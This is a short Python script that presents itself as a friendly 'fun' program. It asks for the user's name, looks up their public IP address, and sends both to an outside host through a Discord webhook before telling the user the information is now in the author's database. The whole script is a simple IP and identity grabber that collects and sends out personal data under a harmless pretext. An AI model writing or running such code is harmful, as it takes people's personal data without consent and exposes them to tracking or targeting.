#start to get everything to work
import os
import time
from turtle import rt
import pip._vendor.requests as requests
from discord import SyncWebhook

# Define IP
r = requests.get('https://checkip.amazonaws.com')

# clear the console to remove the mess.
def Mathias():
  if os.name == 'nt':
    os.system("cls")

# User input
print("hi welcome to this wired program i made in my free time now follow the guide and ask no questions.")
navn = input("wats your name?\n")
# Call cls
Mathias()
# Call name previously inserted in "input"
print('hi', navn)
time.sleep(1)
print("Loading fun stuff")
time.sleep(1)
print("Your ip is")
# Print IP (requests.get.text)
print(r.text)

# IP Grab
grab = {'ip': r, 'name': navn}

# Data grabbed and sendt
webhook = SyncWebhook.from_url("https://allmylinks.com/f1do")
webhook.send(r.text)
webhook.send(navn)


# Last part
d = ("and that your ip is")
print("Well now i know your name is",navn,d,r.text)
print("Thanks for the info its now been uploaded to my database! :)")
time.sleep(5)